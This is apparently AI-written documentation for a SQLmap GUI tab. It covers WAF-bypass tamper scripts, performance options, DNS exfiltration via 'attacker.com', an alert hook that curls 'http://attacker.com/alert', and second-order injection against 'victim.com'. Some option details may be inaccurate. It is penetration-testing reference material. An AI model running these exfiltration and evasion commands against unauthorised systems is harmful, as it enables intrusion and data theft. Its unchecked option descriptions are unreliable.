# Miscellaneous Tab - Advanced and Specialized SQLmap Options

The Miscellaneous tab contains advanced and specialized SQLmap options that don't fit into other categories, including tamper scripts, optimization settings, and experimental features.

## 📋 Overview

The Miscellaneous tab contains four main sections:
1. **Tamper Scripts** - WAF bypass and payload modification
2. **Optimization** - Performance and efficiency options
3. **Miscellaneous Options** - Various utility options
4. **Experimental Features** - Cutting-edge and beta features

## 🛡️ Tamper Scripts

### Tamper Script Selection
**Parameter:** `--tamper=TAMPERS`
**Description:** Use tamper scripts to bypass WAF/filtering
**Format:** Comma-separated list of tamper names
**Examples:**
```
--tamper=space2comment
--tamper=apostrophemask,randomcase
--tamper=space2comment,versionedkeywords,space2plus
```
**Use Cases:**
- Web Application Firewall bypass
- Input validation evasion
- Character encoding bypass
- SQL injection filtering circumvention

### Available Tamper Scripts

#### Character Replacement
- **apostrophemask**: Replace apostrophes with UTF-8 fullwidth
- **base64encode**: Base64 encode the payload
- **charencode**: URL encode characters
- **charunicodeencode**: Unicode URL encode characters
- **randomcase**: Random character case

#### Space Manipulation
- **space2comment**: Replace spaces with `/**/` comments
- **space2dash**: Replace spaces with `--` comments
- **space2hash**: Replace spaces with `#` comments
- **space2plus**: Replace spaces with `+` characters
- **space2randomblank**: Replace spaces with random blank characters

#### Keyword Obfuscation
- **versionedkeywords**: Use MySQL versioned comment keywords
- **versionedmorekeywords**: Use more MySQL versioned comment keywords

#### Advanced Techniques
- **multiplespaces**: Add multiple spaces around SQL keywords
- **nonrecursivereplacement**: Replace keywords with representations
- **percentage**: ASP-style percent encoding
- **sp_password**: Append `sp_password` to bypass MSSQL logging
- **unionalltounion**: Replace `UNION ALL` with `UNION`
- **unmagicquotes**: Wide character bypass for magic_quotes

### Custom Tamper Scripts
**Parameter:** `--tamper=/path/to/custom_tamper.py`
**Description:** Use custom tamper script
**Requirements:** Python script following SQLmap tamper API
**Use Cases:**
- Organization-specific WAF bypass
- Custom encoding schemes
- Proprietary filtering evasion

## ⚡ Optimization Options

### Keep Alive
**Parameter:** `--keep-alive`
**Description:** Use persistent HTTP connections
**Behavior:** Reuses TCP connections for multiple requests
**Use Cases:**
- Faster scanning with many requests
- Reduced network overhead
- Better performance on slow connections

### Null Connection
**Parameter:** `--null-connection`
**Description:** Retrieve page length without actual content
**Behavior:** Uses HEAD requests to check response sizes
**Use Cases:**
- Faster detection with large responses
- Bandwidth conservation
- Quick vulnerability assessment

### Concurrent HTTP Requests
**Parameter:** `--threads=NUM`
**Description:** Maximum number of concurrent HTTP requests
**Default:** 1
**Range:** 1-10
**Examples:**
```
--threads=5
--threads=10
```
**Use Cases:**
- Faster scanning
- Resource utilization
- Network capacity management

### Predict Output
**Parameter:** `--predict-output`
**Description:** Predict common queries output
**Behavior:** Uses heuristics to predict query results
**Use Cases:**
- Faster enumeration
- Reduced requests
- Common pattern recognition

### Skip Heuristics
**Parameter:** `--skip-heuristics`
**Description:** Skip heuristic detection mechanisms
**Behavior:** Disables intelligent detection
**Use Cases:**
- Manual control
- False positive reduction
- Specific technique testing

## 🔧 Miscellaneous Options

### Skip URL Encoding
**Parameter:** `--skip-urlencode`
**Description:** Skip URL encoding of payload data
**Behavior:** Sends payloads as-is
**Use Cases:**
- Custom encoding requirements
- Binary payload transmission
- Specific application handling

### Chunked Transfer Encoding
**Parameter:** `--chunked`
**Description:** Use HTTP chunked transfer encoding
**Behavior:** Sends data in chunks
**Use Cases:**
- Large payload handling
- WAF bypass
- Protocol testing

### Force SSL
**Parameter:** `--force-ssl`
**Description:** Force usage of SSL/HTTPS requests
**Behavior:** Converts HTTP to HTTPS
**Use Cases:**
- SSL-only applications
- Mixed content handling
- Security testing

### Force Redirects
**Parameter:** `--follow-redirects`
**Description:** Follow HTTP redirects
**Behavior:** Automatically follows 3xx responses
**Use Cases:**
- Multi-page applications
- Authentication flows
- Complex web applications

### Ignore Proxy
**Parameter:** `--ignore-proxy`
**Description:** Ignore system default proxy settings
**Behavior:** Bypasses proxy configuration
**Use Cases:**
- Direct connection requirements
- Proxy interference issues
- Local testing

### Disable Color Output
**Parameter:** `--disable-coloring`
**Description:** Disable colored console output
**Behavior:** Plain text output
**Use Cases:**
- Log file compatibility
- Terminal limitations
- Automated processing

### Force DNS Exfiltration
**Parameter:** `--dns-domain=DOMAIN`
**Description:** Use DNS exfiltration technique
**Behavior:** Exfiltrates data via DNS queries
**Examples:**
```
--dns-domain=attacker.com
--dns-domain=test.example.com
```
**Use Cases:**
- Firewall bypass
- Data exfiltration
- Restricted environments

### Second-Order Injection
**Parameter:** `--second-order=URL`
**Description:** Detect and exploit second-order SQL injection
**Behavior:** Tests for delayed injection effects
**Examples:**
```
--second-order=http://victim.com/profile.php?id=1
--second-order=http://victim.com/search.php?q=inject
```
**Use Cases:**
- Stored procedure vulnerabilities
- Multi-step injection attacks
- Complex application flows

## 🧪 Experimental Features

### 3rd Level Domain
**Parameter:** `--3rd-level-domain`
**Description:** Use 3rd level domain for DNS exfiltration
**Behavior:** Creates subdomains for data exfiltration
**Use Cases:**
- Advanced DNS exfiltration
- Complex data transfer
- Firewall evasion

### Alert Filtering
**Parameter:** `--alert=ALERT`
**Description:** Run host OS command(s) when SQL injection found
**Examples:**
```
--alert="notify-send 'SQLi found'"
--alert="curl http://attacker.com/alert"
--alert="echo 'Vulnerability detected' >> /var/log/alerts.log"
```
**Use Cases:**
- Real-time notifications
- Automated alerting
- Incident response

### Beep When Vulnerable
**Parameter:** `--beep`
**Description:** Beep when SQL injection is found
**Behavior:** Audio notification on discovery
**Use Cases:**
- Long-running scans
- Background monitoring
- Accessibility

### Cleanup Database
**Parameter:** `--cleanup`
**Description:** Clean up SQLmap temporary tables and files
**Behavior:** Removes injection artifacts
**Use Cases:**
- Forensic cleanup
- System maintenance
- Evidence removal

### Dependencies Check
**Parameter:** `--dependencies`
**Description:** Check for missing dependencies
**Behavior:** Verifies required libraries and tools
**Use Cases:**
- Installation verification
- Troubleshooting
- Environment validation

## 📝 Usage Examples

### WAF Bypass with Tamper Scripts
```
Tamper Scripts: space2comment,randomcase,apostrophemask
Keep Alive: ✓ Enabled
Threads: 5
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,randomcase,apostrophemask --keep-alive --threads=5
```

### Performance Optimization
```
Null Connection: ✓ Enabled
Predict Output: ✓ Enabled
Concurrent Requests: 8
Skip Heuristics: ✗ Disabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/admin.php?id=1" --null-connection --predict-output --threads=8
```

### SSL and Redirect Handling
```
Force SSL: ✓ Enabled
Follow Redirects: ✓ Enabled
Chunked Encoding: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/secure.php?id=1" --force-ssl --follow-redirects --chunked
```

### DNS Exfiltration
```
DNS Domain: attacker.com
3rd Level Domain: ✓ Enabled
Ignore Proxy: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/restricted.php?id=1" --dns-domain=attacker.com --3rd-level-domain --ignore-proxy
```

### Second-Order Injection Testing
```
Second Order: http://victim.com/profile.php?id=1
Alert Command: notify-send 'Second-order SQLi found'
Beep: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/input.php" --second-order=http://victim.com/profile.php?id=1 --alert="notify-send 'Second-order SQLi found'" --beep
```

### Comprehensive Miscellaneous Configuration
```
Tamper Scripts: space2comment,base64encode
Keep Alive: ✓ Enabled
Null Connection: ✓ Enabled
Threads: 3
Predict Output: ✓ Enabled
Force SSL: ✓ Enabled
Disable Coloring: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/complex.php?id=1" --tamper=space2comment,base64encode --keep-alive --null-connection --threads=3 --predict-output --force-ssl --disable-coloring
```

## ⚠️ Important Considerations

### Tamper Script Selection
- **Compatibility**: Not all tamper scripts work with all DBMS
- **Performance impact**: Some tamper scripts slow down scanning
- **Detection risk**: Complex tamper may trigger advanced WAF
- **Testing required**: Test tamper combinations for effectiveness

### Performance Tuning
- **Thread limits**: Too many threads can overwhelm target
- **Network capacity**: Consider connection speed and limits
- **Target tolerance**: Some applications can't handle high request rates
- **Resource usage**: Monitor local system resources

### Experimental Features
- **Stability**: Experimental features may be unstable
- **Compatibility**: May not work with all SQLmap versions
- **Documentation**: Limited documentation for experimental features
- **Support**: May not be supported in all environments

### Security Implications
- **Detection evasion**: Some options help bypass security controls
- **Legal compliance**: Ensure authorized use of all features
- **System impact**: Some features can affect target system stability
- **Data handling**: Consider data exfiltration implications

## 🔧 Troubleshooting

### Tamper Scripts Not Working
**Problem:** WAF still blocking despite tamper scripts
**Solutions:**
1. Try different tamper combinations
2. Test tamper scripts individually
3. Check WAF type and rules
4. Use custom tamper scripts

### Performance Issues
**Problem:** Scanning too slow or resource intensive
**Solutions:**
1. Reduce thread count
2. Enable null connection
3. Use predict output
4. Disable unnecessary features

### SSL/HTTPS Problems
**Problem:** SSL connection issues
**Solutions:**
1. Check SSL certificate validity
2. Use --force-ssl appropriately
3. Verify HTTPS support
4. Check proxy SSL handling

### DNS Exfiltration Not Working
**Problem:** DNS exfiltration failing
**Solutions:**
1. Verify DNS server control
2. Check firewall DNS rules
3. Test DNS resolution
4. Use different domain

### Experimental Feature Issues
**Problem:** Experimental features not working
**Solutions:**
1. Check SQLmap version compatibility
2. Verify feature requirements
3. Test in controlled environment
4. Check for known issues

## 📚 Related Tabs

- **[Injection Tab](injection_tab.md)**: Parameter selection and payload customization
- **[Detection Tab](detection_tab.md)**: Detection level and technique configuration
- **[Request Tab](request_tab.md)**: HTTP request customization
- **[General Tab](general_tab.md)**: Output and logging options</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/tabs/miscellaneous.md
